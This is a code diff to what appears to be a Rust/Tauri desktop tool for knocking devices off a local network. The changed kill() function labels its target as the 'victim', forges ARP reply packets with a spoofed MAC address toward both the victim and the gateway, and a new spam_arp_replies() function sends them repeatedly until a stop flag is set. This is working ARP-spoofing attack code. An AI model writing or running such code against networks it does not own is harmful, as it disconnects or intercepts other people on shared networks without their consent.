@@ -14,7 +14,7 @@ use pnet::packet::{MutablePacket, Packet};
 use pnet_datalink::{DataLinkReceiver, DataLinkSender, MacAddr, NetworkInterface};
 use std::io::ErrorKind::TimedOut;
 
-use crate::VENDORS;
+use crate::{LoveThreads, State, VENDORS};
 
 const DATALINK_RCV_TIMEOUT: u64 = 500;
 const ARP_PACKET_SIZE: usize = 28;
@@ -53,22 +53,44 @@ pub fn find_gateway(inter: &NetworkInterface) -> TargetDetails {
     };
 }
 
-pub fn kill(client: TargetDetails, gateway: TargetDetails, interface: &NetworkInterface) {
-    println!("{}", client.ipv4);
-    println!("{}", gateway.ipv4);
-    println!("{}", gateway.mac);
-    println!("{}", client.mac);
+pub fn kill(
+    client: TargetDetails,
+    gateway: TargetDetails,
+    interface: &NetworkInterface,
+    delay: Duration,
+    state: tauri::State<State>,
+) {
+    println!("victim's IP {}", client.ipv4);
+    println!("victim's MAC{}", client.mac);
+    println!("gateway's IP {}", gateway.ipv4);
+    println!("gateway's MAC {}", gateway.mac);
     let source_mac: MacAddr = "ba:3b:bb:20:18:9a".parse().unwrap();
     let packets = vec![
         create_kill_packet(gateway.ipv4, client.ipv4, source_mac, client.mac),
         create_kill_packet(client.ipv4, gateway.ipv4, source_mac, gateway.mac),
     ];
-    let (mut tx, mut rx) = create_data_link(interface);
-    loop {
+    let timed_out = Arc::new(AtomicBool::new(false));
+    state.threads.lock().unwrap().insert(
+        client.ipv4.to_string(),
+        LoveThreads {
+            timed_out: timed_out.clone(),
+        },
+    );
+    spam_arp_replies(timed_out, packets, interface, delay);
+}
+
+pub fn spam_arp_replies(
+    timed_out: Arc<AtomicBool>,
+    packets: Vec<EthernetPacket<'_>>,
+    interface: &NetworkInterface,
+    delay: Duration,
+) {
+    let (mut tx, _) = create_data_link(&interface);
+    while !timed_out.load(Ordering::Relaxed) {
         for p in &packets {
             tx.send_to(p.packet(), Some(interface.clone()));
         }
-        thread::sleep(Duration::from_millis(1500));
+        thread::sleep(delay);
     }
 }
 
@@ -190,11 +212,7 @@ fn find_source_ip(network_interface: &NetworkInterface) -> Ipv4Addr {
 
 fn get_cidr(interface: &NetworkInterface) -> String {
     let ip = interface.ips.iter().find(|f| f.is_ipv4()).unwrap();
-    return format!(
-        "{}/{}",
-        ip.ip().to_string(),
-        ip.prefix().to_string()
-    );
+    return format!("{}/{}", ip.ip().to_string(), ip.prefix().to_string());
 }
 
 fn send_arp_request(
